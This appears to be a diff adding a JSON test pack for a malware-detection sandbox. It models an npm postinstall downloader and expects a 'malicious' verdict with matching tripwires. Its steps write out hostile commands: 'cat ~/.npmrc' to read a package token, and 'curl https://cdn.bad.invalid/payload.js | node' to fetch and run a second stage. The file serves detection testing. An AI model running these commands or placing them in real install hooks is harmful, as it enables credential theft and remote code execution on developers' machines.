@@ -1,0 +1,90 @@
+{
+  "pack_id": "js-postinstall-downloader",
+  "title": "JavaScript postinstall downloader",
+  "attack_family": "package_install_malware",
+  "public_tier": "public_core",
+  "runtime_family": "java_script",
+  "artifact_type": "npm_package",
+  "artifact": {
+    "ecosystem": "npm",
+    "source": "https://registry.npmjs.org/zitpit-postinstall-downloader",
+    "requested_selector": "1.0.0",
+    "selector_kind": "exact_version"
+  },
+  "incident_refs": ["public/npm-postinstall-pattern"],
+  "technique_refs": ["install-hook-downloader", "credential-scrape"],
+  "control_pair_id": "control-benign-npm-install",
+  "confidence_policy": "hard_ban",
+  "allowed_baseline_signals": [],
+  "persona_overrides": [],
+  "required_personas": ["developer_workstation"],
+  "required_scenarios": [
+    { "name": "npm_postinstall", "detonation": "install_build", "phase": "install" }
+  ],
+  "suite_tags": ["fast", "artifact", "queue", "public_core"],
+  "execution": {
+    "browser_required": false,
+    "vm_required": false,
+    "queue_required": true,
+    "runner_mode": "queue_full"
+  },
+  "expected_verdict": { "verdict": "malicious" },
+  "expected_tripwires": {
+    "required": ["downloader", "shell_spawn", "package_credential_access"],
+    "allowed_false_positives": []
+  },
+  "control_expectations": {
+    "require_clean_verdict": true,
+    "max_shared_tripwires": 0,
+    "notes": ["benign npm install must stay clean"]
+  },
+  "evidence_minimums": {
+    "require_captured_request": true,
+    "require_quarantine_job": true,
+    "require_lab_run": true,
+    "require_evidence_bundle": true,
+    "require_feed_visibility": true,
+    "require_browser_trace": false
+  },
+  "timing": {
+    "max_queue_latency_ms": 2000,
+    "max_detonation_startup_ms": 2000,
+    "max_verdict_completion_ms": 2000
+  },
+  "files": ["package.json", "postinstall.js"],
+  "steps": [
+    {
+      "step_id": "read_npm_token",
+      "detail": "postinstall reads the fake package token from .npmrc",
+      "phase": "install",
+      "process_lineage": ["npm install", "node postinstall.js"],
+      "command": "cat ~/.npmrc",
+      "file_path": "~/.npmrc",
+      "canary_id": "fake-npm-token",
+      "tripwire": "package_credential_access",
+      "severity": "high"
+    },
+    {
+      "step_id": "fetch_second_stage",
+      "detail": "postinstall downloads a second stage over HTTPS",
+      "phase": "install",
+      "process_lineage": ["npm install", "node postinstall.js"],
+      "command": "curl https://cdn.bad.invalid/payload.js",
+      "network_target": "cdn.bad.invalid",
+      "network_protocol": "https",
+      "tripwire": "downloader",
+      "severity": "high"
+    },
+    {
+      "step_id": "spawn_shell",
+      "detail": "postinstall shells out to execute the downloader",
+      "phase": "install",
+      "process_lineage": ["npm install", "node postinstall.js"],
+      "command": "/bin/sh -c curl https://cdn.bad.invalid/payload.js | node",
+      "network_target": "cdn.bad.invalid",
+      "network_protocol": "https",
+      "tripwire": "shell_spawn",
+      "severity": "high"
+    }
+  ]
+}
